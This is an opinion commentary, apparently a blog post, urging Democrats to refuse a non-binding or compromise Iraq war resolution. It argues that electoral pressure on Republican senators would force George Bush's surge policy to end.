Are you kidding ?
Who in their right mind thinks Bush will be pressured to make a change in Iraq if it 's non-binding ?
No one can reasonably believe that .
Please tell me the Democrats are n't this bad in politics .
Do they not understand how political pressure works ?
The most precious thing in the world to a politician is his own ass .
If those Republican Senators become convinced that they will lose if they keep voting with Bush , they will bend .
I guarantee it .
Self preservation is the number one rule of politics .
This is the time for strength .
Make them bend to your will .
It 's the only way out .
If the Democrats vote for any kind of fake compromise with so - called moderate Republicans , there is no way in the world George Bush is going to leave Iraq .
He has managed to delay withdrawal with his ridiculous surge strategy for nearly a year now .
Democrats would have to be crazy to let him keep doing it any longer .
And if the Democrats did concede for no reason , it would all of a sudden be their careers that are on the line , whether it 's through primary fights all over the country or a reinforced image as weaklings or simply owning our presence in Iraq through continued capitulation to the president .
How many times can they allow Bush to stay in Iraq and credibly claim they are against that policy ?
This is last chance saloon .
I am genuinely curious .
Is it possible that the Democrats have one more fold in them ?
It seems too irrational for the imagination to bear .
Or can they stand up for themselves -- and for us -- for the first time in such a long time ?
That also seems hard to imagine .
I can't recollect what a strong Democratic Party looked like .
It seems like a foreign concept now .
How is it going to go ?
What will they do ?
Will they stand ?
This is real drama .
I do n't know the answer , and I 'm not sure I want to .
